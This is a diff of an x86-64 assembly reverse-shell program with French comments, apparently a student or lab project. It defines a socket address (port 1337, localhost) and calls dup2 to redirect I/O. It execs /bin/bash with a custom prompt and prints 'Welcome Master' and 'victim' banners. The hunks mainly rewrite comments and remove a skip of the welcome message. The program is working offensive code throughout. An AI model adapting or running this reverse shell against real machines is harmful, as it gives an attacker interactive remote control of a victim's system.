@@ -18,12 +18,13 @@ extern dup2
 
 section .data
     sockaddr:
-        dw 2    
-        dw 0x3905 ; 0x3905 = 0x05 0x39 = 1337p
-        dd 0x0100007F
+        dw 2    ; AF_INET
+        dw 0x3905 ; 0x3905 = 0x05 0x39 = 1337
+        dd 0x0100007F ;localhost
         dq 0
 
     msg:
+    ;tous les msg affichés
         conn_test_msg db ">> Connecting to machine....", 0x0A
         conn_test_msg_len equ $ - conn_test_msg
 
@@ -58,13 +59,13 @@ section .data
         skt_err_msg db ">> /!\Socket creation failed/!\", 0x0A
         skt_err_msg_len equ $ - skt_err_msg
 
-        welcome_master db 0x1B, "[1;35m" ; ESC[1;36m = bold cyan
+        welcome_master db 0x1B, "[1;35m" ; ;violet en code ANSI
         db "********************************************************", 0x0A
         db "*                                                      *", 0x0A
         db "*                   Welcome Master!                    *", 0x0A
         db "*                                                      *", 0x0A
         db "********************************************************", 0x0A
-        db 0x1B, "[0m", 0x0A ; ESC[0m = reset attributes, Newline
+        db 0x1B, "[0m", 0x0A ; reset
         welcome_master_len equ $ - welcome_master
         
 
@@ -86,7 +87,7 @@ section .data
     shell:
         db "/bin/bash", 0
     argv dq shell, 0
-    prompt_ps1 db "PS1=>> ", 0 ;personnaliser le prompt
+    prompt_ps1 db "PS1=>> ", 0 ;personnalisation prompt
     env dq prompt_ps1, 0 ;liste des variables d'environnement
 
 
@@ -100,16 +101,14 @@ _start:
 .connection: 
 
     mov al, [welcome_displayed] ; Charger la valeur du drapeau
-    cmp al, 1                   ; Comparer avec 1 (déjà affiché)
-    je .skip_welcome  
-     ; --- Affichage du message de bienvenue sur le shell distant ---
-    ; Ceci est écrit sur le socket (maintenant stdout) avant l'execve.
-    mov rdi, 1                  ; Descripteur de fichier 1 (stdout)
+    cmp al, 1                   ; Comparer avec 1 
+   
+    mov rdi, 1                  ; Descripteur de fichier 
     lea rsi, [rel welcome_master] ; Pointeur vers le message de bienvenue
-    mov rdx, welcome_master_len ; Longueur du message
+    mov rdx, welcome_master_len 
     call write  
     
-    mov byte[welcome_displayed], 1                ; Écrit le message de bienvenue
+    mov byte[welcome_displayed], 1 
 
     .skip_welcome:
     ;initialisation du socket msg
@@ -167,13 +166,11 @@ _start:
     cmp rsi, 3
     jne .redirection ;si erreur redirection
 
-     ; --- Affichage du message de bienvenue sur le shell distant ---
-    ; Ceci est écrit sur le socket (maintenant stdout) avant l'execve.
-    mov rdi, 1                  ; Descripteur de fichier 1 (stdout)
+    ;msg de bienvenue
+    mov rdi, 1                  ; Descripteur de fichier 1
     lea rsi, [rel welcome_victim] ; Pointeur vers le message de bienvenue
-    mov rdx, welcome_victim_len ; Longueur du message
-    call write                  ; Écrit le message de bienvenue
-
+    mov rdx, welcome_victim_len 
+    call write                 
  
 
     ;creation reverse shell
